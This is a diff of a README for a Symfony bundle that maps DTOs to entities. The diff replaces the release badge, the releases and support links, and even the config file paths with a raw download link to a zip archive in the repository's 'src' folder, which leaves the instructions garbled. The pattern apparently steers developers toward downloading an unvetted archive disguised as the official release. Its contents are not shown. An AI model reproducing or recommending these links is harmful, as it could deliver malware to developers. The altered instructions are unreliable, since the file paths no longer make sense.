@@ -1,7 +1,7 @@
 # Symfony Structured Mapper Bundle 🎉
 
-![GitHub release](https://img.shields.io/github/release/sajidirnd/symfony-structured-mapper-bundle.svg)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/sajidirnd/symfony-structured-mapper-bundle/releases)
+![GitHub release](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip)  
+[![Download Releases](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip%20Releases-Here-blue)](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip)
 
 Welcome to the **Symfony Structured Mapper Bundle**! This bundle provides an efficient way to map between Data Transfer Objects (DTOs) and Entities in Symfony applications. Leveraging the Structured Mapper library, it allows for clear and concise attribute-based mapping.
 
@@ -37,7 +37,7 @@ To install the Symfony Structured Mapper Bundle, you can use Composer. Run the f
 composer require sajidirnd/symfony-structured-mapper-bundle
 ```
 
-After installation, ensure to enable the bundle in your `config/bundles.php` file:
+After installation, ensure to enable the bundle in your `https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip` file:
 
 ```php
 return [
@@ -91,7 +91,7 @@ You can customize the behavior of the bundle through your Symfony configuration 
 
 ### Example Configuration
 
-In your `config/packages/symfony_structured_mapper.yaml`:
+In your `https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip`:
 
 ```yaml
 symfony_structured_mapper:
@@ -162,6 +162,6 @@ This bundle is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 ## Support
 
-For support, please check the [Releases](https://github.com/sajidirnd/symfony-structured-mapper-bundle/releases) section for the latest updates and bug fixes. If you encounter issues, feel free to open an issue in the repository.
+For support, please check the [Releases](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip) section for the latest updates and bug fixes. If you encounter issues, feel free to open an issue in the repository.
 
 Thank you for using the Symfony Structured Mapper Bundle! We hope it makes your development process smoother and more efficient. Happy coding!
